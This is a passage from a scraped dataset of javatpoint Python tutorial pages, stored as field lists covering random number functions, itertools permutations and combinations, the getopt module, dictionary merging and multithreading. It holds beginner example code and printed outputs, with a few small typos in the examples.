exclusive, and it not gets generated in a random number.', 'Look at this random.randrange(3, 30, 3) function that will generate any random integer value between 3 to 30 like 3, 6, 9, 12, …27. But this function never includes 30 while generating a random number.', ""Let's see an example where we are generating a random integer number within a given range. This example shows all the different forms of random.randrange() function."", 'Look at this example in which we are violating the rule by passing the start parameter greater than the stop parameter in random.randrange() function, which generates an error message as:', 'Python random module has a choice() function used to choose a random element from a list or other sequence. A random.choice() function is used to returns a random element from the list of values.', ""In the random.choices() function k is the number of elements to be returned. Suppose we don't mention the value for k parameter the random.choices() returns a single item from the sequence or list."", 'The random.choices() function is mostly used for returning random elements with various possibilities. This function also takes weight (k) the number of random choices. For example, we want to print 3 random movies name from list of 5 movies. ', 'The random.randint() function takes two parameters start, which is a starting range, and stop, which is an end range. Both parameters (start, stop) are included while generating a random number.', 'This example will create a list of multiple random integers using the randint() function. Generating a list of 5 random integers between 1 and 100, both values are inclusive.', 'However, there may be a possibility that the random.randint() function returns a duplicate number in the output result. To avoid the duplicate random integer number in a result, use random.sample() function.', 'In the above example, there may be a possibility that random.randint() generates the duplicate random number from the list. If you want to generate unique random numbers from a list, use random.sample() function.', ""The random.sample() function generates unique elements from a set, list, and other sequences. Python's random.sample() function allows random sampling of more than one element within a range from the list without duplicating."", 'The Python sort() function is used to sort the random integer numbers of the list in ascending order (by default). We can also sort the list value in descending order by specifying its order reverse = True. The default value of reverse is False.']","['Here, we will discuss the randrange() function of the random module. The randrange() function is used to generate a random number between the specified range in its parameter. It accepts three parameters: starting number, stop number, and width, which is used to skip a number in the range.', 'The random.randrange() function returns a random integer number within the given range, i.e., start and stop. The random.randrange() function takes three parameters as an input start, stop, and width. Out of these three parameters, the two parameters start and width are optional.', 'Generating a random in an application always been important, and it has several real-time uses in day-to-day life. For example, generating and sending a random number to a customer as an OTP (one-time-password) for making a safe transaction. Another example of generating a random number is used while playing the ludo game to generate a random dice number.', 'You can also generate a random integer number of a specific length. If you want to generate a random number of length 3, input the start and stop parameter in randrange() function as least number of 3 digit length (100) and least number of 4 digit length (1000) because it generates a random number of 3 digit form 100 to 999 where 4 digits (1000) is excluded.']","['random.randrange(start, stop[, width])', 'import random', 'print(""Generating random number within a given range "")', '# Random number between 0 and 29', 'number1 = random.randrange(30)', 'print(""Random integer: "", number1)', '# Random number between 10 and 29', 'number2 = random.randrange(10, 30)', 'print(""Random integer: "", number2)', '# Random number between 25 and 200 divisible by 5', 'number3 = random.randrange(25, 201, 5)', 'print(""Random integer: "", number3)', 'import random', '#print ""Random number range (multiple) of 5""', 'number = random.randrange(5, 100, 5)', 'print(""Random number range (multiple) of 5 is "", number)', 'import random', 'number1 = random.randrange(100, 1000)', 'print(""First random number of length 3 is: "", number1)', 'number2 = random.randrange(100, 1000)', 'print(""Second random number of length 3 is: "", number2)', 'import random', 'randomNagativeInteger = random.randrange(-50, -10)', 'print(""Random negative integer number between -50 to -10"")', 'print(""Random negative integer number between -50 to -10 is: "",randomNagativeInteger)', 'import random', 'number1 = random.randrange(-5, 5)', 'print(number1)', 'number2 = random.randrange(-5, 5)', 'print(number2)', 'import random', 'randomNumber = random.randrange(10,5)', 'random.choice(sequence)', 'random.choices(sequence, k=l)', 'import random', 'listValue = [5,10,15,20,25,30]', 'item = random.choice(listValue)', 'print(""random item from list is: "", item)', 'import random', ""movieList = ['Matrix', 'Terminator', 'Black Panther', 'Avengers', 'Titanic']"", 'randomMovies = random.choices(movieList, k=3)', 'print(""random movies from list are: "", randomMovies)', 'random.randint(start, stop)', 'import random', 'randomListValue = []', '# specifing length of list equal to 5', 'for i in range(0, 5):', '# generates random numbers from 1 to 100', 'randomListValue.append(random.randint(1, 100))', 'print(""Printing list of 5 generated random numbers"")', 'print(randomListValue)', 'import random', '# Generate 10 unique random numbers within a range', 'randomList = random.sample(range(0, 100), 10)', 'print(randomList)', 'import random', '# Generate 10 unique random numbers within a range', 'randomList = random.sample(range(0, 100, 5), 10)', 'print(randomList)', 'import random', 'randomList = random.sample(range(50, 100, 5), 5)', 'print(""Before sorting random integers list"")', 'print(randomList)', '# sort the list ascending order by default', 'randomList.sort()', 'print(""After sorting random integers list"")', 'print(randomList)', 'import random', 'randomList = random.sample(range(50, 100, 5), 5)', 'print(""Before sorting random integers list"")', 'print(randomList)', '# sort the list descending order', 'randomList.sort(reverse=True)', 'print(""After sorting random integers list"")', 'print(randomList)']","['First random number of length 3 is: 813', 'Second random number of length 3 is: 770', 'Random negative integer number between -50 to -10', 'Random negative integer number between -50 to -10 is:  -43', '-5', '0', 'random item from list is:  10', ""random movies from list are:  ['Avengers', 'Black Panther', 'Titanic']"", 'Printing list of 5 generated random numbers', '[65, 82, 3, 39, 40]', '[15, 17, 16, 66, 34, 85, 71, 82, 97, 48]', '[75, 40, 20, 55, 15, 10, 5, 90, 95, 70]', 'Before sorting random integers list', '[90, 80, 60, 55, 85]', 'After sorting random integers list', '[55, 60, 80, 85, 90]', 'Before sorting random integers list', '[70, 50, 80, 90, 85]', 'After sorting random integers list', '[90, 85, 80, 70, 50]']",[],"['|||The start parameter is a starting or lower limit integer number in a random range. If the start parameter is not passed in parameter, it takes default value 0 (zero).|||A stop parameter is the last number or upper limit integer number in a random range.|||The width parameter is a range between each number in the random sequence. This parameter is optional, and if the width parameter is not passed in parameter, it takes default value 1 (one).||||||choice()|||randint()|||sample()|||sort()|||']"
153,['Permutation and Combination in Python'],"['In this tutorial, we will learn how to get the permutation and combination of a given data using Python. We will use Python inbuilt package to find the permutation and combination of a given number.']","['https://www.javatpoint.com/getopt-module-in-python', 'https://www.javatpoint.com/python-random-randrange', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-itertools', 'https://www.javatpoint.com/getopt-module-in-python', 'https://www.javatpoint.com/python-random-randrange', 'https://www.javatpoint.com/getopt-module-in-python']",[],[],"['Importing the Required library', 'Permutation', 'Permutation of the fixed length', 'Combination of String', 'Combination with Replacement', 'Combination of Numeric Set']",['Combination of Numeric Set'],[],"['To calculate the permutation and combination, we need to import the itertools library. We can import it using the below command.', 'The above statement will import the itertools library and forms a pathway to its function.', ""Let's take two sets of permutation."", 'Example - 2', 'Example - 3', 'In the above code, we have got the combination of the multiple integer number.', 'In the above code, we have calculated the fixed permutation by passing length as two.', ""If the given input is in the sorted order, the combination tuples will be returned in sorted order. Let's understand the following example."", 'In this tutorial, we have discussed the itertools module to find the permutation and combination of the given data using the Python script.']","['Permutation and combination are an essential part in mathematics. Python provides the itertools library that has the in-built functions to calculate permutation and combination.', 'Now, we need to create the list of a sequence as an input. This list of input will return the tuple which consists of permutation and combination. We can also set the length of the permutation and combination.', ""A permutation is an arrangement of a set where order does matter. Python itertools module provide inbuilt permutation() method to find the permutation. Let's understand the following example."", 'In the above code, we have imported the itertools module. We called the permutation() method which takes string as an argument and provides an itertools object. It is necessary to use for loop to get the each permutation.', ""We can calculate the permutation of the fixed length set where we only take a specified number of each element permutation. Let's understand the following example."", ""The itertools module consists of another method called combination_with_replacement() which takes under consideration the combination of a number itself as well. Let's understand its example.""]","[""Combination is a collection of the element where the order doesn't matter. Python itertools module provides the combination() method to calculate the combination of given data. We can calculate the combination of a string. Let's understand the following example.""]","['import itertools', 'from itertools import permutations', ""seq = permutations(['1','2','3'])"", 'print(seq)', 'for p in list(seq):', 'print(p)', 'from itertools import permutations', ""seq = permutations(['A','B'])"", 'for p in list(seq):', 'print(p)', 'from itertools import permutations', 'list1 = [1, 2, 3, 4]', 'seq = permutations(list1)', 'print(seq)', 'for p in list(seq):', 'print(p)', 'from itertools import permutations', ""seq = permutations(['H', 'e', 'l', 'l', 'o'], 3)"", 'for p in list(seq):', 'print(p)', 'import itertools', 'seq = ""ABC""', 'com_seq = itertools.combinations(seq, 2)', 'for c in com_seq:', 'print(c)', 'from itertools import combinations_with_replacement', ""com = combinations_with_replacement(['J', 'a', 'v', 'a', 't', 'p', 'o', 'i', 'n', 't'], 2)"", '#Print the list of combinations', 'for c in list(com):', 'print(c)', 'import itertools', 'v = [1, 2, 3, 4]', 'com_seq = itertools.combinations_with_replacement(v, 3)', 'for i in com_seq:', 'print(i)']","[""('1', '2', '3')"", ""('1', '3', '2')"", ""('2', '1', '3')"", ""('2', '3', '1')"", ""('3', '1', '2')"", ""('3', '2', '1')"", ""('A', 'B')"", ""('A', 'C')"", ""('B', 'C')"", '(1, 2, 3, 4)', '(1, 2, 4, 3)', '(1, 3, 2, 4)', '(1, 3, 4, 2)', '(1, 4, 2, 3)', '(1, 4, 3, 2)', '(2, 1, 3, 4)', '(2, 1, 4, 3)', '(2, 3, 1, 4)', '(2, 3, 4, 1)', '(2, 4, 1, 3)', '(2, 4, 3, 1)', '(3, 1, 2, 4)', '(3, 1, 4, 2)', '(3, 2, 1, 4)', '(3, 2, 4, 1)', '(3, 4, 1, 2)', '(3, 4, 2, 1)', '(4, 1, 2, 3)', '(4, 1, 3, 2)', '(4, 2, 1, 3)', '(4, 2, 3, 1)', '(4, 3, 1, 2)', '(4, 3, 2, 1)', ""('H', 'e')"", ""('H', 'l')"", ""('H', 'l')"", ""('H', 'o')"", ""('e', 'H')"", ""('e', 'l')"", ""('e', 'l')"", ""('e', 'o')"", ""('l', 'H')"", ""('l', 'e')"", ""('l', 'l')"", ""('l', 'o')"", ""('l', 'H')"", ""('l', 'e')"", ""('l', 'l')"", ""('l', 'o')"", ""('o', 'H')"", ""('o', 'e')"", ""('o', 'l')"", ""('o', 'l')"", ""('A', 'B')"", ""('A', 'C')"", ""('B', 'C')"", ""('J', 'J')"", ""('J', 'a')"", ""('J', 'v')"", ""('J', 'a')"", ""('J', 't')"", ""('J', 'p')"", ""('J', 'o')"", ""('J', 'i')"", ""('J', 'n')"", ""('J', 't')"", ""('a', 'a')"", ""('a', 'v')"", ""('a', 'a')"", ""('a', 't')"", ""('a', 'p')"", ""('a', 'o')"", ""('a', 'i')"", ""('a', 'n')"", ""('a', 't')"", ""('v', 'v')"", ""('v', 'a')"", ""('v', 't')"", ""('v', 'p')"", ""('v', 'o')"", ""('v', 'i')"", ""('v', 'n')"", ""('v', 't')"", ""('a', 'a')"", ""('a', 't')"", ""('a', 'p')"", ""('a', 'o')"", ""('a', 'i')"", ""('a', 'n')"", ""('a', 't')"", ""('t', 't')"", ""('t', 'p')"", ""('t', 'o')"", ""('t', 'i')"", ""('t', 'n')"", ""('t', 't')"", ""('p', 'p')"", ""('p', 'o')"", ""('p', 'i')"", ""('p', 'n')"", ""('p', 't')"", ""('o', 'o')"", ""('o', 'i')"", ""('o', 'n')"", ""('o', 't')"", ""('i', 'i')"", ""('i', 'n')"", ""('i', 't')"", ""('n', 'n')"", ""('n', 't')"", ""('t', 't')"", '(1, 1, 1)', '(1, 1, 2)', '(1, 1, 3)', '(1, 1, 4)', '(1, 2, 2)', '(1, 2, 3)', '(1, 2, 4)', '(1, 3, 3)', '(1, 3, 4)', '(1, 4, 4)', '(2, 2, 2)', '(2, 2, 3)', '(2, 2, 4)', '(2, 3, 3)', '(2, 3, 4)', '(2, 4, 4)', '(3, 3, 3)', '(3, 3, 4)', '(3, 4, 4)', '(4, 4, 4)']",[],[]
154,['Getopt module in Python'],"['The getopt modules is analyser used for command-line options, which are based on the convention organized by the UNIX getopt() function. It is basically used to analysing an argument sequence like sys.argv. We can also understand this module as it helps the scripts to analyse the command - line arguments in sys.argv. This module works like the C programming language getotp() function for analysing the command - line parameters.']","['https://www.javatpoint.com/merge-two-dictionaries-in-python', 'https://www.javatpoint.com/permutation-and-combination-in-python', 'https://www.javatpoint.com/merge-two-dictionaries-in-python', 'https://www.javatpoint.com/permutation-and-combination-in-python', 'https://www.javatpoint.com/merge-two-dictionaries-in-python']","['https://static.javatpoint.com/python/images/getopt-module-in-python.png', 'https://static.javatpoint.com/python/images/getopt-module-in-python2.png']",[],"['Python getopt Function', 'Function Arguments of Getopt()', 'Short Form Options:', 'Long-form options in Getopt ( )', 'Conclusion:']","['Example 1:', 'Example 2:']",[],"['Parameters:', 'The getopt.getopt() module takes the following parameters.', 'args: The args is the list of arguments which are to be passed', 'Supported option syntax includes:', 'The getopt ( ) module function takes three arguments:', 'Users can combine the Long and short form of the options in a single call.', 'Suppose the user\'s program is taking two options \' - a \' and \' - b \' with the \' - b \' option needs an argument, then the value must be "" ab: "".', ""In this example, the user can use the full form as ' first_name ' and ' last_name ' instead of using the short form as ' f ' and ' l '.""]","['This modules provide some primary function that is the (goes by the same name that is) getopt(). The functionality of this function is to analyse command - line options and parameter lists.', 'options: The options are the string of options letters which the script wants to recognize. The option that needs arguments should be written with a colon ( :).', 'long_options: This is the list of the string which have the name of long options. The option that needs arguments should be written with an equal sign ( = ).', 'If the user\'s program wants to take two options, such as, "" - noarguement "" and "" - witharguement "" then, the sequence of the arguements will be [ \' noarguement \' , \' witharguement= \' ].', ""Here, the user has created a function full_name(), which will print the full name of the user after receiving the first name and last name from the command line. The user has also abbreviated the first name as ' f ' and the last name as ' l '."", ""The user has to remember that the single dash ( ' - ' ) for short forms of the arguments and for long forms of the arguments users should use the double dash ( ' -- ' )."", 'In this article, we have discussed the getopt() module and its functions and their arguments. We have also explained the different implementing forms with proper rules in the command line prompt, with well-defined examples.']","['Return Type: The return value of getopt () module function consists of two elements. The first element of the return value is the list of ( option , value ) pairs, and the second element of the return value is a list of program arguments which are left when the options list was stripped.']","['getopt.getopt ( args , options , [ long_options ] )', '-\t- bvalue', '-\t- b value', '-\t-- noargument', '-\t-- withargument=value', '-\t-- withargument value', 'import getopt     #importing the getopt module', ""print getopt.getopt ( [ ' -a ' , ' -bval ' , ' -c ' , ' val ' ] , ' ab:c: ' )"", '$ python getopt_short.py', ""( [ ( ' -a ' , ' ' ) , ( ' -b ' , ' val ' ) , ( ' -c ' , ' val ' ) ] , [ ] )"", 'import getopt                               # importing getopt () module', ""print getopt.getopt ( [ ' -noarguement ' , ' -witharguement ' , ' value ' , ' -witharguement2 = another ' ] , '  ' , [ ' noarguement ' , ' witharguement = ' , ' witharguement2 = ' ] )"", '$ python getopt_long.py', ""( [ ( ' -noarguement ' , ' ' ) , ( '?witharguement ' , ' value ' ) , ( ' -witharguement2 ' , ' another ' ) ] , [ ] )"", 'import sys', '# importing getopt module', 'import getopt', 'def full_name ( ):', 'first_name = None', 'last_name = None', 'argv = sys.argv [ 1: ]', 'try:', 'opts , args = getopt.getopt ( argv, "" f:l: "" )', 'except:', 'print ( "" Error "" )', 'for opt , arg in opts:', ""if opt in [ ' -f ' ]:"", 'first_name = arg', ""elif opt in [ ' -l ' ] :"", 'last_name = arg', 'print ( first_name + "" "" + last_name )', 'full_name ( )', 'import sys', 'import getopt                                           # import getopt module', 'def full_name ( ):', 'first_name = None', 'last_name = None', 'argv = sys.argv [ 1: ]', 'try:', 'opts , args = getopt.getopt ( argv , "" f:l: "" ,  [ "" first_name = "" , "" last_name = "" ] )', 'except:', 'print ( "" Error "" )', 'for opt , arg in opts:', ""if opt in [ ' -f ' , ' --first_name ' ] :"", 'first_name = arg', ""elif opt in [ ' -l ' , ' -- last_name ' ] :"", 'last_name = arg', 'print ( first_name + "" "" + last_name )', 'full_name ( )']",[],[],"['|||The first argument of the getopt() module consists of the classification of the arguments to be analysed. This generally derives from sys.argv [ 1: ] (the program name is ignored in sys.argv [ 0 ] ) argument sequence.|||The second argument is the string which is the option definition for single-character options. If any of the option needs an argument, its letter is written with a colon [ : ].|||The third argument of the getopt ( ) module function is the sequence of the names of the long-style option. Long - style options name can be consisting of more than a single character, for example: -- noargument or -- witharguement. The name of options in the sequence of arguments must not include the "" -- "" prefix. If any long - style option needs an argument, and its name should be written with equals ( = ) to sign.|||']"
155,['Merge two Dictionaries in Python'],"['Python Dictionary is a data structure that contains all elements in key-value pairs. Each key-value pair maps the keys with their associative value. Hence it is also known as the associative array of Python Dictionary. All the elements of the dictionary are enclosed within curly braces {}. Furthermore, we use a colon (:) symbol in between the key-value pairs that separate each key from its associative value. Dictionary elements can be arranged in any order and changed dynamically in the Python program. In this topic, we will learn how to merge two dictionaries using various methods of Python dictionaries.']","['https://www.javatpoint.com/multithreading-in-python-3', 'https://www.javatpoint.com/getopt-module-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-dictionary', 'https://www.javatpoint.com/https://www.javatpoint.com/python-programs', 'https://www.javatpoint.com/https://www.javatpoint.com/python-for-loop', 'https://www.javatpoint.com/https://www.javatpoint.com/python-dictionary-update-method', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-functions', 'https://www.javatpoint.com/https://www.javatpoint.com/python-dict-function', 'https://www.javatpoint.com/multithreading-in-python-3', 'https://www.javatpoint.com/getopt-module-in-python', 'https://www.javatpoint.com/multithreading-in-python-3']",['https://static.javatpoint.com/python/images/merge-two-dictionaries-in-python.png'],[],[],"['Merge two dictionaries using for loop', 'Merge two dictionaries using the update() method', 'Merge two dictionaries in Python using the Function', 'Merge two dictionaries using update() method when both dictionaries having same keys', 'Merge two dictionaries using Copy() and Update() Method', 'Merge two dictionaries using the ** operator - Unpacking Operator', 'Merge two dictionaries using the dict() constructor', 'Merge two dictionaries using the dict() constructor and **kwargs', 'Merge two dictionaries using the Collections - ChainMap function', 'Merge two dictionaries using the itertools - chain() method', 'Merge two dictionaries using the merge ( | ) operator']",[],"['Here we use a For loop that iterates the first dictionary and simultaneously adds entries to another dictionary to merge them.', ""Let's consider a program to merge the given dictionaries using the For loop."", 'forDict.py', ""Let's consider a program to merge the given dictionaries in Python without creating the third dictionary."", 'Update1.py', ""Let's consider a program to merge the given dictionaries in Python using the update() method in function."", ""Let's consider a program to merge the given dictionaries in Python using the update() method when both dictionaries contains same keys."", 'sameDict.py', ""Let's consider a program to merge the given dictionaries using the copy and update() method in Python."", 'CopyUpdate.py', 'The unpacking operator used to combine two or more dictionaries within a single expression and stored them in a third dictionary.', ""Let's consider a program to merge the given dictionaries using the ** operator in Python."", ""Let's consider a program to merge the given dictionaries using the dict() method in Python."", 'It is a shortcut method of dict () constructor that uses a kwargs (**) operator to map one dictionary to another with the help of dict () method.', ""Let's consider a program to merge two dictionaries using the dict() constructor and **kwargs operator in Python."", ""Let's consider a program to merge two dictionaries using the ChainMap function in Python."", 'Chain_map.py', ""Let's consider a program to merge two dictionaries using the chain function in Python."", 'It is a merge (|) operator used to merge two dictionaries in Python. Python 3.9 has introduced the merge ( | ) operator in the dict class.', ""Let's write a program to merge the two dictionaries in Python using the merge operator (|).""]",[],"[""The update() method is used in the Python Dictionary to update the current dictionary with the second dictionary's content. Using the update() method, we can avoid creating a third dictionary to store the first dictionary element and then update the second dictionary element."", ""We have the two same keys (Actress and Basketball) in both the dictionaries. When we perform the update method, the latest value of the second dictionary overrides the first dictionary's old values. When the d1 dictionary is executed, it prints Washington and Elizabeth values for the key Actress and Basketball instead of Jasmine Wiley and Jordan."", 'In this method, we copy all the elements of the first dictionary (d1) elements using the copy() function and then assign the copied data into the other dictionary (d3). After that, we update the dictionary d3 with the d2 dictionary using the update() function.', ""A dict() constructor method is similar to the copy() and update() in Python Dictionary. A dict() constructor copies the first dictionary elements to the new dictionary and then followed an update() method to update the new dictionary by the second dictionary's element."", 'ChainMap is a collection of multiple dictionaries that return a single dictionary. It is a faster method to create a new dictionary and run multiple files compared to the update () method. To merge the two dictionaries in Python, we need to import the ChainMap from collections. In ChainMap() function, we pass two dictionaries as an argument that returns the ChainMap instances to map the dictionaries using the dict() constructor to merge the dictionaries.', ""It makes an iterative dictionary that returns an element from the first iterable dictionary until it's finished. And then, it proceeds to the next iterable for further execution in a dictionary. Hence, it represents the consecutive sequences as a single sequence.""]","[""dict1 = { 'Alexandra' : 27,      # given the first dictionary in key-value pairs"", ""'Shelina Gomez' : 22,"", ""'James' : 29,"", ""'Peterson' : 30"", '}', 'dict2 = {', ""'Jasmine' : 19,      # given the second dictionary in key-value pairs"", ""'Maria' : 26,"", ""'Helena' : 30"", '}', 'print(""Before merging the two dictionary "")', 'print(""Dictionary No. 1 is : "", dict1) # print the dict1', 'print(""Dictionary No. 1 is : "", dict2)  # print the dict2', 'dict3 = dict1.copy()  # Copy the dict1 into the dict3 using copy() method', 'for key, value in dict2.items():  # use for loop to iterate dict2 into the dict3 dictionary', 'dict3[key] = value', 'print(""After merging of the two Dictionary "")', 'print(dict3)    # print the merge dictionary', ""d1 = {'Actress ' : 'Jasmine Wiley',"", ""'Cricketer' : 'Nicholas Pooran',"", ""'Basketball': 'Jordan',"", ""'Football' : 'Zindane'"", '# Defines the d2 dictionary', ""d2 = {'Tennis ' : 'Maria',"", ""'Stadium  ' : 'Amsterdam',"", ""'Basketball' : 'Washington',"", ""'Actress' : 'Elizabeth'}"", 'd1.update(d2) # append the d2 dictionary items into the d1 dictionary.', 'print( ""Merge two dictionaries :"")', 'print(d1) # print the merge dictionary', 'def merge_twoDict(a, b): # define the merge_twoDict() function', 'return (a.update(b)) # append the second dictionary (b) to the first dictionary (a)', ""a = {'USA' : 'New York',"", ""'Jermany' : 'Jakarta',"", ""'England' : 'London' }"", ""'India' : 'Delhi',"", ""'Russia' : 'Russian',"", ""'Australia' : 'Sydney'"", '}', 'merge_twoDict(a, b) # pass two dictionaries to merge_twoDict() function', 'print(""Merged Dictionaries is : "")', 'print(a) # print the merge dictionaries', '# Defines the d1 dictionary in key- value pairs', 'd1 = {', ""'Cricketer' : 'Nicholas Pooran',"", ""'Basketball': 'Jordan',"", ""'Football' : 'Zindane',"", ""'Actress' : 'Jasmine Wiley'"", '# Defines the d2 dictionary in key- value pairs', ""d2 = { 'Tennis' : 'Maria',"", ""'Stadium' : 'Amsterdam',"", ""'Basketball' : 'Washington',"", ""'Actress' : 'Elizabeth' }"", 'd1.update(d2) # append the d2 dictionary items into the d1 dictionary.', 'print( ""Merge two dictionaries :"")', 'print(d1) # print the merge dictionary', 'dict1 = {', ""'Student' : 'Butler',"", ""'Course' : 'Computer Science',"", ""'Address' : 'Los Angeles'"", 'dict2 = {', ""'Teacher' : 'Rosy',"", ""'Subject' : 'Computer Science'"", '# Use Copy() function to copy the dict1 into the dict3', 'dict3 = dict1.copy()', 'print(""Before Merge"")', 'print(dict3) # print dict3 dictionary', '# use update() dictionary function to update the dict3 using the dict2.', 'dict3.update(dict2)', 'print(""After Merge of the two Dictionary is : "", dict3)', 'Res = { **dictF1, ** dictF2 }', 'dict1 = {', ""'Student' : 'Butler',"", ""'Course' : 'Computer Science',"", ""'Address' : 'Los Angeles'"", 'dict2 = {', ""'Teacher' : 'Rosy',"", ""'Subject' : 'Computer Science'"", 'dict3 = {', ""'Country' : 'England',"", ""'State' : 'California',"", ""'mob' : +3487434"", '# Use ** operator or Unpack Operator', 'd5 = {**dict1, **dict2}', 'print(""Merge two dictionaries"", d5) # Merge two dictionaries', '**dict1, **dict2, **dict3', 'print(""Merge more than two dictionaries"", d4) # Merge multiples dictionaries', 'dict1 = {', ""'Student' : 'Butler',"", ""'Course' : 'Computer Science',"", ""'Address' : 'Los Angeles'"", 'dict2 = {', ""'Teacher' : 'Rosy',"", ""'Subject' : 'Computer Science'"", '# Use dict() constructor', 'd3 = dict(dict1)', 'print(""Before Merge"", d3)', 'd3.update(dict2)', 'print(""Merge two dictionaries"", d3) # Merge two dictionaries', 'D3 = dict(dict1, **dict)', 'dict1 = {', ""'Student' : 'Butler',"", ""'Course' : 'Computer Science',"", ""'Address' : 'Los Angeles'"", '# Second dictionary is:', 'dict2 = {', ""'Teacher' : 'Rosy',"", ""'Subject' : 'Computer Science'"", '# Use dict() constructor', 'd3 = dict(dict1, **dict2)', 'print(""Merge two dictionaries"", d3) # Merge two dictionaries', 'dict1 = {', ""'Student' : 'Butler',"", ""'Course' : 'Computer Science',"", ""'Address' : 'Los Angeles'"", 'dict2 = {', ""'Teacher' : 'Rosy',"", ""'Subject' : 'Computer Science'"", 'from collections import ChainMap  # import the ChainMap from collections', '# Use ChainMap() constructor', 'd3 = dict(ChainMap(dict1, dict2)) # passes two parameters as an argument', 'print(""Merge two dictionaries"", d3) # Merge two dictionaries', 'itertools.chain( *iterables )', 'dict1 = {', ""'Student' : 'Butler',"", ""'Course' : 'Computer Science',"", ""'Address' : 'Los Angeles'"", 'dict2 = {', ""'Teacher' : 'Rosy',"", ""'Subject' : 'Computer Science'"", 'from itertools import chain  # import the chain() function from itertools', '# Use ChainMap() constructor', 'd3 = dict(chain(dict1.items(), dict2.items())) # passes two parameters as an argument', 'print(""Merge two dictionaries"", d3) # Merge two dictionaries', 'dict1 |= dict2', 'def merge(dict1, dict):', 'result = dict1 | dict2 # use merge operator (|)', 'return result', ""dict1 = {'A' : 'Apple', 'B' : 'Ball', 'C' : 'Cat' } # define dict1"", ""dict2 = {'D' : 'Dog', 'E' : 'Elephant', 'F' : 'Fish' } # define dict2"", 'dict3 = merge(dict1, dict2) # call merge() function', 'print (dict3)    # print dict3']","['Before merging the two dictionary', ""Dictionary No. 1 is :  {'Alexandra': 27, 'Selina Gomez': 22, 'James': 29, 'Peterson': 30}"", ""Dictionary No. 1 is :  {'Jasmine': 19, 'Maria': 26, 'Helena': 30}"", 'After merging of the two Dictionary', ""{'Alexandra': 27, 'Selina Gomez': 22, 'James': 29, 'Peterson': 30, 'Jasmine': 19, 'Maria': 26, 'Helena': 30}"", ""{'Actress ': 'Jasmine Wiley', 'Cricketer': 'Nicholas Pooran', 'Basketball': 'Washington', 'Football': 'Zindane', 'Tennis ': 'Maria', 'Stadium  ': 'Amsterdam', 'Actress': 'Elizabeth'}"", 'Merged Dictionaries is :', ""{'USA': 'New York', 'Germany': 'Jakarta', 'England': 'London', 'India': 'Delhi', 'Russia': 'Russian', 'Australia': 'Sydney'}"", 'Merge two dictionaries :', ""{'Cricketer': 'Nicholas Pooran', 'Basketball': 'Washington', 'Football': 'Zindane', 'Actress': 'Elizabeth', 'Tennis': 'Maria', 'Stadium': 'Amsterdam'}"", 'Before Merge', ""{'Student': 'Butler', 'Course': 'Computer Science', 'Address': 'Los Angeles'}"", ""After Merge of the two Dictionary is :  {'Student': 'Butler', 'Course': 'Computer Science', 'Address': 'Los Angeles', 'Teacher': 'Rosy', 'Subject': 'Computer Science'}"", ""Merge two dictionaries {'Student': 'Butler', 'Course': 'Computer Science', 'Address': 'Los Angeles', 'Teacher': 'Rosy', 'Subject': 'Computer Science'}"", ""Merge more than two dictionaries {'Student': 'Butler', 'Course': 'Computer Science', 'Address': 'Los Angeles', 'Teacher': 'Rosy', 'Subject': 'Computer Science', 'Country': 'England', 'State': 'California', 'mob': 3487434}"", ""Before Merge {'Student': 'Butler', 'Course': 'Computer Science', 'Address': 'Los Angeles'}"", ""Merge two dictionaries {'Student': 'Butler', 'Course': 'Computer Science', 'Address': 'Los Angeles', 'Teacher': 'Rosy', 'Subject': 'Computer Science'}"", ""Merge two dictionaries {'Student': 'Butler', 'Course': 'Computer Science', 'Address': 'Los Angeles', 'Teacher': 'Rosy', 'Subject': 'Computer Science'}"", ""Merge two dictionaries {'Teacher': 'Rosy', 'Subject': 'Computer Science', 'Student': 'Butler', 'Course': 'Computer Science', 'Address': 'Los Angeles'}"", ""Merge two dictionaries {'Student': 'Butler', 'Course': 'Computer Science', 'Address': 'Los Angeles', 'Teacher': 'Rosy', 'Subject': 'Computer Science'}"", ""{'A': 'Apple', 'B': 'Ball', 'C': 'Cat', 'D': 'Dog', 'E': 'Elephant', 'F': 'Fish'}""]",[],[]
156,['Multithreading in Python 3'],"['A thread is the smallest unit of a program or process executed independently or scheduled by the Operating System. In the computer system, an Operating System achieves multitasking by dividing the process into threads. A thread is a lightweight process that ensures the execution of the process separately on the system. In Python 3, when multiple processors are running on a program, each processor runs simultaneously to execute its tasks separately.']","['https://www.javatpoint.com/static-in-python', 'https://www.javatpoint.com/merge-two-dictionaries-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-applications', 'https://www.javatpoint.com/https://www.javatpoint.com/python-programs', 'https://www.javatpoint.com/static-in-python', 'https://www.javatpoint.com/merge-two-dictionaries-in-python', 'https://www.javatpoint.com/static-in-python']",['https://static.javatpoint.com/python/images/multithreading-in-python-3.png'],[],['Python Multithreading'],"['Benefits of Multithreading in Python', 'When to use Multithreading in Python?', 'How to achieve multithreading in Python?', 'Thread modules', 'Threading Modules']","['Note: The Python Global Interpreter Lock (GIL) allows running a single thread at a time, even the machine has multiple processors.', ""Note: If we do not use the join() method, the interpreter can execute any print statement inside the Python program. Generally, it executes the first print statement because the interpreter executes the lines of codes from the program's start.""]","['Following are the benefits to create a multithreaded application in Python, as follows:', 'There are two main modules of multithreading used to handle threads in Python.', 'It is started with Python 3, designated as obsolete, and can only be accessed with _thread that supports backward compatibility.', 'Thread Class Methods', 'Follow the given below steps to implement the threading module in Python Multithreading:', '1. Import the threading module', 'Create a new thread by importing the threading module, as shown.', 'A threading module is made up of a Thread class, which is instantiated to create a Python thread.', '2. Declaration of the thread parameters: It contains the target function, argument, and kwargs as the parameter in the Thread() class.', 'For example:', 'Joinmethod.py', '5. Synchronizing Threads in Python', ""Let's write a program to use the threading module in Python Multithreading."", 'Threading.py']","['To implement the thread module in Python, we need to import a thread module and then define a function that performs some action by setting the target with a variable.', 'The threading module is a high-level implementation of multithreading used to deploy an application in Python. To use multithreading, we need to import the threading module in Python Program.', 'In the above code, we invoked the print_hello() function as the target parameter. The print_hello() contains one parameter n, which passed to the args parameter.', ""3. Start a new thread: To start a thread in Python multithreading, call the thread class's object. The start() method can be called once for each thread object; otherwise, it throws an exception error."", ""4. Join method: It is a join() method used in the thread class to halt the main thread's execution and waits till the complete execution of the thread object. When the thread object is completed, it starts the execution of the main thread in Python."", 'When the above program is executed, the join() method 